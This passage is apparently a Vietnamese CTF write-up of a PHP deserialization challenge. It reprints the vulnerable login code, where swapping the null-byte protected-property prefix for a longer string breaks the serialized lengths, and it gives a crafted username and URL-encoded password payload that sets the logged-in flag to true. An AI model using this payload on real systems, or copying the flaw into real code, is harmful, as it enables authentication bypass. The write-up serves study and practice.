["_password":protected]=>   string(3) "123"   
["_logged":protected]=>   bool(true)   
["_email":protected]=>   string(44) ";s:10:"

```

![image](https://hackmd.io/_uploads/S1GnXe5C6.png)

## Deserialization Overflow


```
<?php
include 'flag.php';

ini_set('display_errors', 1);
error_reporting(E_ALL);

class User
{
    protected $_username;
    protected $_password;
    protected $_logged = false;
    protected $_email = '';

    public function __construct($username, $password)
    {
        $this->_username = $username;
        $this->_password = $password;
        $this->_logged = false;
    }

    public function setLogged($logged)
    {
        $this->_logged = $logged;
    }

    public function isLogged()
    {
        return $this->_logged;
    }

    public function getUsername()
    {
        return $this->_username;
    }

    public function getPassword()
    {
        return $this->_password;
    }
}

function storeUserSession($user)
{
    $serialized_value = serialize($user);
    // avoid the storage of null byte, replace it with \0 just in case some session storage don't support it
    // this is done because protected object are prefixed by \x00\x2a\x00 in php serialisation
    $data = str_replace(chr(0) . '*' . chr(0), '\0\0\0', $serialized_value);
    $_SESSION['user'] = $data;
}

function getUserSession()
{
    $user = null;
    if (isset($_SESSION['user'])) {
        $data = $_SESSION['user'];
        $serialized_user = str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
        $user = unserialize($serialized_user);
    } else {
        $user = new User('guest', '');
    }
    return $user;
}

session_start();
$errorMsg = "";
$currentUser = null;

// keep entered values :
if (isset($_POST['submit'])) {
    $currentUser = new User($_POST['username'], $_POST['password']);
    $isLogged = $currentUser->getUsername() === 'admin' && 
        hash('sha512',$currentUser->getPassword()) === 'b3b7b663909f8e9b4e2a581337159e8a5e468c088ec802cb99a027c1dcbefb7d617fcab66ab4402d4617cde33f7fce93ae3c4e8f77aec2bb5f8c7c8aec3bbc82'; // don't try to bruteforce me this is useless
    $currentUser->setLogged($isLogged);
    $errorMsg = ($isLogged) ? '' : 'Invalid username or password.';
    storeUserSession($currentUser);
} else {
    $currentUser = getUserSession();
}

if ($currentUser->isLogged()) {
    echo 'you are logged in! congratz, the flag is: ' . $FLAG;
    die();
}

if (isset($_GET['source'])) {
    show_source(__FILE__);
    die();
}
?>
```

- Đầu tiên quan sát cách để có được flag đó là _isLogged phải set thành true.

```
if ($currentUser->isLogged()) {
    echo 'you are logged in! congratz, the flag is: ' . $FLAG;
    die();
}
```

- Trang web có chức năng đăng nhập sau khi submit sẽ khởi tạo `  $currentUser = new User($_POST['username'], $_POST['password']); ` sau đó gán isLogged = true nếu username của `currentUser` === 'admin' và hash('sha512', password) === 'b3b7b663909f8e9b4e2a581337159e8a5e468c088ec802cb99a027c1dcbefb7d617fcab66ab4402d4617cde33f7fce93ae3c4e8f77aec2bb5f8c7c8aec3bbc82' 
- Cuối cùng gọi hàm `storeUserSession` tiến hành `serialize` `$currentUser` sau đó thực hiện thay thế ``(chr(0) . '*' . chr(0)`` bằng `\0\0\0` trong thông tin vừa dược serialize
- ![image](https://hackmd.io/_uploads/rk9qFqt06.png)

- Mình giải thích thêm ở đây là những thuộc tính là protected thì sau khi serialize thì sẽ có dấu `*` đứng trước nó

```
<?php
    class Person {
        public $name = "Tom";
        private $age = 18;
        protected $sex = "male";
        public function hello() {
            echo "hello";
        }
    }
    $example = new Person();
    $example_ser = serialize($example);
    echo $example_ser;
-- sau khi thực hiện kết quả sẽ là 
O:6:"Person":3:{s:4:"name";s:3:"Tom";s:11:"Personage";i:18;s:6:"*sex";s:4:"male";}
```
- ![image](https://hackmd.io/_uploads/SJkE59K0p.png)

- oke bây giờ thì còn hàm  :-1: 

``
function getUserSession()
{
    $user = null;
    if (isset($_SESSION['user'])) {
        $data = $_SESSION['user'];
        $serialized_user = str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
        $user = unserialize($serialized_user);
    } else {
        $user = new User('guest', '');
    }
    return $user;
}
``

- hàm này sẽ lấy session và lấy ra giá trị username sau đó thực hiện thay thế ngược lại giá trị `\0\0\0` bằng ``(chr(0) . '*' . chr(0)`` và thực hiện unserialize


- Vậy có thể hiểu được sink của cuộc tấn công nằm ở này.

- Nhưng mà ta khó có thể control được đầu vào của isLogged, bơi vì password đã được hash với `sha512` :(

- Stuck ở chỗ này khá lâu, thì mình để ý đoạn này tại sao server lại replace_all `null*null` bằng `\0\0\0` và tên chall là over-flow:>
- Over-flow : mô tả tình trạng khi một hệ thống hoặc nguồn tài nguyên không thể xử lý hoặc chứa các dữ liệu hoặc giá trị lớn hơn giới hạn được quy định.
- Vậy nên ta lợi dụng việc khi lưu sessionUser thì sau khi lưu lần đầu số byte của nó tăng 3 bytes từ ` * ` sang `\0\0\0` vậy nên đối với $currentUser có 4 phần từ protected nên sau khi thay thế sẽ tăng 12 bytes. Sau khi unserialize nó mới trở lại ban đầu.

- >> Ta chèn `\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0` vào `username` và password vào `"%3b"%3bs%3a12%3a"%00%00_password"%3bs%3a3%3a"123"%3bs%3a10%3a"%00%00_logged"%3bb%3a1%3bs%3a9%3a"%00*%00_email"%3bs%3a44%3a` khi đó thì quá trình getSessionUser
- Luồng xử lí như sau:
- ![image](https://hackmd.io/_uploads/HkdIk2KRT.png)

- ![image](https://hackmd.io/_uploads/r1o_12K0p.png)

- Lúc này session đã được lưu lại.
- ![image](https://hackmd.io/_uploads/rypxx3YR6.png)

- GET / sẽ thực hiện gọi hàm `getUserSession` và thực hiện thay thế "\0\0\0" thành `null*null` deserialize ta sẽ ghi đè được isLogged là `true`.
